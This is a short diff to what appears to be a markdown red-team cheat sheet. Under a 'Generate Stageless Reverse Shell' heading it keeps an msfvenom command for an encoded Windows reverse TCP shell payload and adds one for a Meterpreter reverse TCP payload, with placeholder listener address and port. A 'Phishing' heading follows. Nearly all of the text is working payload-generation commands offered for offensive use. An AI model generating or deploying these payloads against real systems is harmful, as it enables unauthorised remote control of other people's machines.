@@ -59,6 +59,8 @@ msfvenom -p windows/x64/messagebox TEXT="0xjs" -o msgbox64.bin
 #### Generate Stageless Reverse Shell
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 11 -o shell.bin
+
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -o meter_rev.bin
 ```
 
 ## Phishing
